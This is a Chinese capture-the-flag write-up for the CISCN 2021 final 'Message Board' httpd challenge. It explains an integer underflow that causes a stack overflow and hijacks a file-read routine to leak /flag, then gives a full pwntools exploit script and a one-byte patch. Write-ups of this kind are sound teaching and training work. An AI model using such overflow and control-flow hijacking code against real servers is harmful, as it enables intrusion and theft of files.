> 原文链接: https://www.anquanke.com//post/id/247645 


# ciscn 2021 Final Day2 Message Board 思路分享


                                阅读量   
                                **24807**
                            
                        |
                        
                                                                                    



[![](https://p5.ssl.qhimg.com/t01566e32813fd65e6b.jpg)](https://p5.ssl.qhimg.com/t01566e32813fd65e6b.jpg)



## 0x00 前言

今年华为之夜没有中奖，看来抽奖致富不可取，还是要树立勤劳致富的正确态度。所以就让我来分享一下今天刚打的`httpd`

[附件](https://wwa.lanzoui.com/iPBQdrl67de)(附件不包含html网页，不能用浏览器访问这个题)



## 0x01 程序分析

首先看main函数，似乎整个main都没干啥实际有用的东西，最后跟进`sub_804906C(s);` 这里是程序逻辑的核心。首先理清程序大致的一个逻辑。这其中有一个if语句是区分POST和GET的，GET分支的语句基本上就是读取文件然后输出的逻辑。POST语句中submit似乎有点复杂，我们细看这里的变量传递

[![](https://p3.ssl.qhimg.com/t0117b939968b54c1cd.png)](https://p3.ssl.qhimg.com/t0117b939968b54c1cd.png)

如果Message里面没有以“|”结尾的情况，那就要—n。可是问题来了，假如这里的n是0，到时候—n，则`n=0xffffffff`,到下面的`fread`就会造成一个栈溢出。



## 0x02 漏洞利用

### <a class="reference-link" name="EOF"></a>EOF

那看起来似乎是很简单的一个栈溢出？那么你现在首先到达第一个坑点：无法停止读取stdin。细想一下`fread`函数从文件流里读取字符，参数又指定了大小，那么只有`EOF`才能让他停止。所以我们这里理论上只能发送一次ROP链，而且需要让`pwntool`发送`EOF`。查询资料得知：

```
p = remote(xxxx,xx)
p.shutdown_raw('send')
```

可以断开EOF了，我们根据之前访问时的预留的Message对返回地址长度进行动态测量。在我这里大致的HTTP请求偏移0x82d

```
p1 = cyclic(0x82d) + p32(0)
payload = '''POST /submit HTTP/1.1
Content-Length: 0
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: Username=88888; Messages=Gyan

`{``}`'''.format(p1)
```

### <a class="reference-link" name="Gadget"></a>Gadget

细看函数表发现这里没法用常规的思路，一方面只能溢出一次就要点开连接似乎没法泄露`libc`地址，另一方面这里每一个读写函数都要用到文件流

[![](https://p0.ssl.qhimg.com/t01c23d5d89691a64e8.png)](https://p0.ssl.qhimg.com/t01c23d5d89691a64e8.png)

那我就退一步吧！不拿shell，读个文件就行了吧！这里我们可以想到一个地方

[![](https://p5.ssl.qhimg.com/t01e7abd1a3d8c512e5.png)](https://p5.ssl.qhimg.com/t01e7abd1a3d8c512e5.png)

这个函数是封装的读取文件函数。我们劫持到这里可能就可以成功

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01b34139234a5acd59.png)

[![](https://p0.ssl.qhimg.com/t014f4a24ff9428a2d2.png)](https://p0.ssl.qhimg.com/t014f4a24ff9428a2d2.png)

这里的EBP被栈溢出覆盖了，所以我们需要找到一个可控的地址来写文件名就可以成功！

### <a class="reference-link" name="bss%E6%AE%B5%E4%B8%8A%E7%9A%84dest"></a>bss段上的dest

翻看全局变量，我们发现了一个`dest`变量，逆向分析得知他似乎是来装一个HTTP头的，我们断在我们的gadget处看一下dest现在长啥样

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01950e715724b6087e.png)

哈哈，因为一般电脑上`User-Agent` 很长，我这里是

```
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
```

结果只剩下了

```
x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
```

那我把这剩下这段改成`/flag`就不是可以任意文件读啦？<br>
这里的地址是`0x804c1b1` 加上EBP偏移就是`0x804C5DD`

所以最终的payload就是：

```
p1 = cyclic(0x829) +p32(0x804C5DD) + p32(0x8049305)
payload = '''POST /submit HTTP/1.1
Content-Length: 0
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; /flag
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: Username=88888; Messages=Gyan

`{``}`'''.format(p1)
payload = payload.replace("\n","\r\n")
```

exp：

```
from pwn import *
context.log_level = "debug"
p = process(['./httpd'])
# p = remote("10.1.136.10",10000)
elf = ELF("./httpd")
p1 = cyclic(0x829) +p32(0x804C5DD) + p32(0x8049305)
payload = '''POST /submit HTTP/1.1
Content-Length: 0
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; /flag
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: Username=88888; Messages=Gyan

`{``}`'''.format(p1)
payload = payload.replace("\n","\r\n")
p.send(payload)
p.shutdown_raw('send')
p.interactive()
```



## 0x03总结：

这个题非常有意思，一方面比较贴近实战，另一方面让我这个只会栈溢出的菜鸡给我们菜队贡献了一份力量，稳住了排名



## 0x04 patch:

patch 我觉得是作者故意留给你一段代码可以让你可以只patch一个字节

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0155cc87397a970c24.png)

这里的if是判断v14是否是负数，可是v14本身是无符号数，再加上前面的判断就可以完成本身的功能了，所以这里我们把汇编代码对应的`jns`改成`jnz`即可



## 0x05 参考资料：

[https://blog.csdn.net/weixin_43921239/article/details/117341777](https://blog.csdn.net/weixin_43921239/article/details/117341777)
